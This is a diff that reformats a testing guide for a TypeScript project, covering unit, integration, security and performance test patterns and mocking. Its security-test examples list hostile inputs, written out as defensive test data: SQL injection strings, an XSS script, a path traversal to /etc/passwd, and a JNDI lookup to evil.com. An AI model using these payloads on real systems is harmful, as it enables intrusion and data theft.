@@ -80,7 +80,9 @@ describe('Component Name', () => {
   describe('Feature Group 1', () => {
     it('should do something specific', async () => {
       // Arrange
-      const input = TestUtils.generateTestData({ /* test data */ });
+      const input = TestUtils.generateTestData({
+        /* test data */
+      });
 
       // Act
       const result = await component.doSomething(input);
@@ -114,6 +116,7 @@ TestPatterns.unitTest(
 ```
 
 **Characteristics:**
+
 - Test single components in isolation
 - Use mocks for external dependencies
 - Fast execution (under 100ms per test)
@@ -137,6 +140,7 @@ TestPatterns.integrationTest(
 ```
 
 **Characteristics:**
+
 - Test multiple components working together
 - Use real implementations where possible
 - Slower execution (under 1 second per test)
@@ -151,6 +155,7 @@ TestPatterns.securityTest();
 ```
 
 **Characteristics:**
+
 - Test input validation and sanitization
 - Test attack prevention mechanisms
 - Test secure data handling
@@ -165,6 +170,7 @@ TestPatterns.performanceTest(1000); // 1 second max duration
 ```
 
 **Characteristics:**
+
 - Test performance thresholds
 - Measure resource utilization
 - Test scalability
@@ -189,7 +195,7 @@ MockManager.registerMock('myService', mockService);
 // Mock entire modules
 MockManager.mockModule('external-dependency', {
   default: mockImplementation,
-  specificFunction: vi.fn()
+  specificFunction: vi.fn(),
 });
 ```
 
@@ -242,7 +248,7 @@ let requestCount = 0;
 while (Date.now() - startTime < loadTestDuration) {
   await performOperation();
   requestCount++;
-  await new Promise(resolve => setTimeout(resolve, requestInterval));
+  await new Promise((resolve) => setTimeout(resolve, requestInterval));
 }
 
 const requestsPerSecond = (requestCount / loadTestDuration) * 1000;
@@ -258,7 +264,7 @@ const maliciousInputs = [
   "admin'; DROP TABLE users; --",
   '<script>alert("xss")</script>',
   '../../../etc/passwd',
-  '${jndi:ldap://evil.com/a}'
+  '${jndi:ldap://evil.com/a}',
 ];
 
 for (const input of maliciousInputs) {
@@ -283,9 +289,7 @@ expect(canPerform).toBe(false);
 
 ```typescript
 // Verify no sensitive data in logs
-expect(mockLogger.error).not.toHaveBeenCalledWith(
-  expect.stringContaining('password')
-);
+expect(mockLogger.error).not.toHaveBeenCalledWith(expect.stringContaining('password'));
 
 // Verify error messages don't expose sensitive information
 expect(result.error).not.toContain('internal_error_details');
@@ -297,8 +301,7 @@ expect(result.error).not.toContain('internal_error_details');
 
 ```typescript
 // Test expected errors
-await expect(component.operation(invalidInput))
-  .rejects.toThrow('Expected error message');
+await expect(component.operation(invalidInput)).rejects.toThrow('Expected error message');
 
 // Test error handling
 try {
@@ -326,11 +329,11 @@ expect(result.data).toBe(fallbackData);
 // Use standardized test data generators
 const testEntity = global.testUtils.generateEntity({
   name: 'test-entity',
-  metadata: { custom: 'value' }
+  metadata: { custom: 'value' },
 });
 
 const batchItems = global.testUtils.generateBatchItems(10, {
-  kind: 'observation'
+  kind: 'observation',
 });
 ```
 
@@ -480,7 +483,7 @@ it('should prevent SQL injection in search queries', async () => {
   const maliciousQueries = [
     "'; DROP TABLE users; --",
     "' OR '1'='1",
-    "admin' UNION SELECT * FROM secrets --"
+    "admin' UNION SELECT * FROM secrets --",
   ];
 
   for (const query of maliciousQueries) {
